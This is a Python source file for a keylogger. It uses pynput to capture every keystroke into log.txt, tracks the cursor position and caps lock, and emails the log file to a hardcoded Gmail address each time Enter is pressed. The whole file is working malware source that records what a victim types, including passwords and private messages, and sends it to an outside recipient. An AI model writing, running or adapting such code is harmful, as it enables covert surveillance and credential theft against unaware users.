# --------------------------------------------------------------------------------------------------------
#                                         IMPORTING LIBRARIES 

# Importing modules for logging keys
from pynput.keyboard import Key, Listener
import keyboard

import emailSender as es
# --------------------------------------------------------------------------------------------------------

currentPosition = 0
capsLockActive = False

# Logging Keys into a file named - log.txt

def writeToFile(key):
    global currentPosition, capsLockActive
    
    # Exit from keylogger when ESC pressed
    if key == Key.esc:
        return
    
    letter = str(key)
    letter = letter.replace("'", "")
    
    if key == Key.space:
        letter = " "
        
    elif key == Key.shift or key == Key.shift_r:
        letter = ''
    elif key == Key.ctrl_l or key == Key.ctrl_r:
        letter = ''
            
    # When 'enter' key pressed:
    # 1. Go to next line
    # 2. Send the 'log.txt' file via mail upto which it has been tracked and continue tracking
    elif key == Key.enter:
        letter = "\n"
        es.shareViaMail("log.txt", "log.txt" , "bongspatra@gmail.com", False)

    elif key == Key.backspace:
        # Remove the last character from the file
        with open("log.txt", 'r+') as f:
            f.seek(0, 2)
            size = f.tell()
            if size > 0:
                f.seek(size - 1)
                nextchr = f.read()
                if(nextchr == "\n"):
                    f.seek(size - 2)
                else:
                    f.seek(size - 1)
                f.truncate()
                if currentPosition > 0:
                    currentPosition -= 1
        return
    
    elif key == Key.tab: # insert 4 spaces
        letter = "    "
        
    elif key == Key.left:
        # if it is not the begin of the file
        # move one position to the left
        if currentPosition > 0:
            currentPosition -= 1
        return
    
    elif key == Key.right:
        # move right by one position till 
        # we reach end of file
        with open("log.txt", 'r') as f:
            f.seek(currentPosition, 0)
            nextChar = f.read(1)
            if nextChar:
                currentPosition += 1
        return
    
    elif key == Key.caps_lock:
        capsLockActive = not capsLockActive
        return
        
    if capsLockActive and letter.isalpha():
        letter = letter.upper()
    
    file = open("log.txt", "r")
    l = len(file.read())
    if currentPosition >= l:
        with open("log.txt", "a") as f:
            f.write(letter)
            currentPosition += 1
    else:
        with open("log.txt", 'r+') as f:
            f.seek(currentPosition)
            suffixText = f.read()
            f.seek(currentPosition)
            f.write(letter + suffixText)
            currentPosition += len(letter)
    file.close()
        
def closeKLogger(key):
    # exits the keylogger when the ESC key is pressed
    if key == Key.esc:
        return False
    
def start_keylogger():
    with Listener(on_press = writeToFile, on_release = closeKLogger) as l:
        l.join()
        
# start_keylogger()
# ---------------------------------------------------------------------------------------------------------